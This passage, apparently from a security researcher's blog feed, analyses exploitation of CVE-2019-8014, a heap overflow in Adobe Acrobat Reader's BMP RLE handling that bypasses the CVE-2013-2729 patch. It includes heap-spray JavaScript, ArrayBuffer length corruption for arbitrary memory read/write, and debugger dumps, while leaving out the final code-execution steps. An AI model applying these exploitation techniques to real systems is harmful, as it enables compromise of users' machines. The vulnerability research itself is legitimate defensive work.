10101010</span><br><span class="line">;         ArrayBuffer data</span><br><span class="line">304c83a8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83b8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83c8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83d8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83e8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83f8  10101010 10101010 10101010 10101010</span><br><span class="line">304c8408  10101010 10101010 10101010 10101010</span><br><span class="line">304c8418  10101010 10101010 10101010 10101010</span><br><span class="line">304c8428  10101010 10101010 10101010 10101010</span><br><span class="line">304c8438  10101010 10101010 10101010 10101010</span><br><span class="line">304c8448  10101010 10101010 10101010 10101010</span><br><span class="line">304c8458  10101010 10101010 10101010 10101010</span><br><span class="line">304c8468  10101010 10101010 10101010 10101010</span><br><span class="line">304c8478  10101010 10101010 10101010 10101010 ; end of ArrayBuffer</span><br><span class="line">; metadata of next heap buffer (bitmap data)</span><br><span class="line">304c8488  10101010 10101010</span><br><span class="line">; bitmap data begins here</span><br><span class="line">304c8490                    00000000 00000000</span><br></pre></td></tr></table></figure><p>Now the <code>byteLength</code> of the <code>ArrayBuffer</code> object has been changed to <code>0x10101010</code> and we can achieve Out-Of-Bounds access now. So far so good? The fact is that the process will crash immediately since we also changed the <code>DataView</code> pointer.</p><h4 id="5-5-2-Memory-Layout-0"><a href="#5-5-2-Memory-Layout-0" class="headerlink" title="5.5.2 Memory Layout (0)"></a>5.5.2 Memory Layout (0)</h4><p>We can avoid the crash if we can make <code>0x10101010</code> acts like a valid pointer. Obviously, we should arrange the memory layout before triggering the vulnerability. To make it more stable, it should be done even before we create and free the <code>ArrayBuffer</code> objects.</p><p>We need the ability to put any value at any memory address, such as <code>0x10101010</code> . To achieve this goal, we can create lots of <code>ArrayBuffer</code> objects with <code>byteLength</code> setting to <code>0xFFE8</code> . That’s a carefully selected size to make sure that the <code>ArrayBuffer</code> objects will be allocated at predictable addresses.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 0xFFE8 -&gt; byteLength</span></span><br><span class="line"><span class="comment">// 0x10 -&gt; sizeof ObjectElements</span></span><br><span class="line"><span class="comment">// 0x08 -&gt; sizeof heap block's metadata</span></span><br><span class="line"><span class="number">0xFFE8</span> + <span class="number">0x10</span> + <span class="number">0x08</span> = <span class="number">0x10000</span></span><br></pre></td></tr></table></figure><p>I’m not going to discuss how to avoid the crash in details, it’s very easy to figure out the specific conditions. Following code can be used to avoid the crash.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fillHeap</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x1200</span>);</span><br><span class="line">    array[<span class="number">0</span>] = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0xFFE8</span>);</span><br><span class="line">    <span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(array[<span class="number">0</span>]);</span><br><span class="line">    </span><br><span class="line">    dv.setUint32(<span class="number">0xFB8</span>, <span class="number">0x10100058</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0</span>, <span class="number">0x10100158</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0xFFA8</span>, <span class="number">0x10100258</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0x200</span> + <span class="number">0x14</span>, <span class="number">0x10100358</span>, <span class="literal">true</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &amp;lt; array.length; ++i) &#123;</span><br><span class="line">        array[i] = array[<span class="number">0</span>].slice();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> array;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>It’s not done yet. The process still crashes when we try to create a new <code>DataView</code> object for it. We can avoid the crash using the same tricks. Following is the improved code.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fillHeap</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x1200</span>);</span><br><span class="line">    array[<span class="number">0</span>] = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0xFFE8</span>);</span><br><span class="line">    <span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(array[<span class="number">0</span>]);</span><br><span class="line">    <span class="comment">// avoid crash when triggering the vulnerability</span></span><br><span class="line">    dv.setUint32(<span class="number">0xFB8</span>, <span class="number">0x10100058</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0</span>, <span class="number">0x10100158</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0xFFA8</span>, <span class="number">0x10100258</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0x200</span> + <span class="number">0x14</span>, <span class="number">0x10100358</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="comment">// avoid crash when creating new DataView objects</span></span><br><span class="line">    dv.setUint32(<span class="number">0xFFA4</span>, <span class="number">0x10100458</span>, <span class="literal">true</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &amp;lt; array.length; ++i) &#123;</span><br><span class="line">        array[i] = array[<span class="number">0</span>].slice();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> array;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="5-5-3-Global-Read-Write"><a href="#5-5-3-Global-Read-Write" class="headerlink" title="5.5.3 Global Read / Write"></a>5.5.3 Global Read / Write</h4><p>Once we overwrote the <code>byteLength</code> of any <code>ArrayBuffer</code> object with <code>0x10101010</code> , we can leverage this <code>ArrayBuffer</code> object to overwrite next one’s <code>byteLength</code> to <code>0xFFFFFFFF</code> . It’s very easy to search the next <code>ArrayBuffer</code> object if we put a flag value within all the <code>ArrayBuffer</code> objects.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  (1)byteLength            (3)Global Access</span><br><span class="line"> ┌─&lt;───&lt;───&lt;───┐            &lt;──────┬──────&gt;</span><br><span class="line">┌┼────────────┬┼────────────┬──────┼──────┬─────────────┐</span><br><span class="line">│ ArrayBuffer │ Bitmap Data │ ArrayBuffer │     Hole    │</span><br><span class="line">└──────┼──────┴─────────────┴┼────────────┴─────────────┘</span><br><span class="line">       └──&gt;───&gt;───&gt;───&gt;────&gt;─┘</span><br><span class="line">        (2) byteLength to -1</span><br></pre></td></tr></table></figure><p>Now we have the ability to read and write any memory address within the user space.</p><h4 id="5-5-4-Absolute-Address-Access"><a href="#5-5-4-Absolute-Address-Access" class="headerlink" title="5.5.4 Absolute Address Access"></a>5.5.4 Absolute Address Access</h4><p>Once we have the global access ability, we can <strong>search backward</strong> to calculate the base address of the <code>ArrayBuffer</code> object’s backing store buffer, thus we can read and write at any given absolute memory address.</p><p>We can search two flags, <code>ffeeffee</code> or <code>f0e0d0c0</code> , to calculate the base address. To make it more accurate, the bytes around the flag value also need to be verified.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">0:014&gt; dd 30080000</span><br><span class="line">30080000  16b80e9e 0101331b ffeeffee 00000002  ; ffeeffee</span><br><span class="line">30080010  055a00a4 2f0b0010 055a0000 30080000  ; +0x14 -&gt; 30080000</span><br><span class="line">30080020  00000fcf 30080040 3104f000 000002e5</span><br><span class="line">30080030  00000001 00000000 30d69ff0 30d69ff0</span><br><span class="line">30080040  3eb82e96 08013313 00000000 0000ffe8</span><br><span class="line">30080050  00000000 00000000 10100158 00000000</span><br><span class="line">30080060  00000000 00000000 00000000 00000000</span><br><span class="line">30080070  00000000 00000000 00000000 00000000</span><br><span class="line"></span><br><span class="line">0:014&gt; dd 305f4000</span><br><span class="line">305f4000  00000000 00000000 6ab08d69 0858b71a</span><br><span class="line">305f4010  0bbab388 30330080 0ff00112 f0e0d0c0  ; f0e0d0c0</span><br><span class="line">305f4020  15dc2c3f 00000430 305f402c d13bc929  ; +0x0C -&gt; 305f402c</span><br><span class="line">305f4030  e5c521a7 d9b264d4 919cee58 45da954e</span><br><span class="line">305f4040  5c3f608b 2b5fd340 0bae3aa9 2b5fd340</span><br><span class="line">305f4050  0fae32aa d13bc929 e5c521a7 d9b264d4</span><br><span class="line">305f4060  919cee58 45da954e 9c3f608b f952aa94</span><br><span class="line">305f4070  989c772a a1dd934a ac5b154b 2fadd038</span><br></pre></td></tr></table></figure><h4 id="5-5-5-Remaining-Steps"><a href="#5-5-5-Remaining-Steps" class="headerlink" title="5.5.5 Remaining Steps"></a>5.5.5 Remaining Steps</h4><p>Once we can read and write at any given absolute memory address, it’s very easy to achieve code execution. Following are the remaining steps that will not be discussed in this post:</p><ul><li>EIP hijack</li><li>ASLR bypass</li><li>DEP bypass</li><li>CFG bypass</li></ul><h2 id="0x06-CVE-2013-2729"><a href="#0x06-CVE-2013-2729" class="headerlink" title="0x06. CVE-2013-2729"></a>0x06. CVE-2013-2729</h2><p>Three integer overflows were found within the handling of RLE compressed data, one in RLE8 decompression and the other two in RLE4 decompression.</p><p>Why shouldn’t we found four? Because another one have been patched six years ago. You can read <a href="http://blog.binamuse.com/2013/05/readerbmprle.html" target="_blank" rel="noopener">feliam’s write up for CVE-2013-2729</a> if you haven’t read it yet.</p><p>Also, the patch for CVE-2013-2729 can be found within the handling of RLE8 compressed data.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dst_xpos = BYTE1(cmd) + xpos;</span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || dst_xpos &lt; xpos || </span><br><span class="line">     dst_xpos &lt; BYTE1(cmd) || dst_xpos &gt; width )  <span class="comment">// overflow check</span></span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;         <span class="comment">// CxxThrowException</span></span><br></pre></td></tr></table></figure><p>It’s astonishing that Adobe only patched the case that was reported and ignored the other three.</p><h2 id="0x07-Lessons-Learned"><a href="#0x07-Lessons-Learned" class="headerlink" title="0x07. Lessons Learned"></a>0x07. Lessons Learned</h2><p>For product developers, please try to understand the root cause of the vulnerability and eliminate similar ones as much as you can.</p><p>For security researchers, patch analysis is a good way to figure out what the developers were thinking, and maybe you can find bypass solutions (this happens sometimes).</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;em&gt;This post provides detailed analysis for CVE-2019-8014 which was fixed in Adobe Acrobat Reader / Pro DC recently. Interestingly, it’s a patch bypass of CVE-2013-2729 which was &lt;del&gt;&lt;strong&gt;fixed&lt;/strong&gt;&lt;/del&gt; six years ago. This post also discusses how to exploit the vulnerability.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Author: &lt;strong&gt;Ke Liu of Tencent Security Xuanwu Lab&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Vulnerability" scheme="https://programlife.net/categories/Vulnerability/"/>
    
      <category term="Analysis" scheme="https://programlife.net/categories/Vulnerability/Analysis/"/>
    
    
      <category term="BMP" scheme="https://programlife.net/tags/BMP/"/>
    
      <category term="Adobe Reader" scheme="https://programlife.net/tags/Adobe-Reader/"/>
    
      <category term="PDF" scheme="https://programlife.net/tags/PDF/"/>
    
      <category term="CVE-2019-8014" scheme="https://programlife.net/tags/CVE-2019-8014/"/>
    
      <category term="CVE-2013-2729" scheme="https://programlife.net/tags/CVE-2013-2729/"/>
    
      <category term="XFA" scheme="https://programlife.net/tags/XFA/"/>
    
      <category term="RLE" scheme="https://programlife.net/tags/RLE/"/>
    
  </entry>
  
</feed>
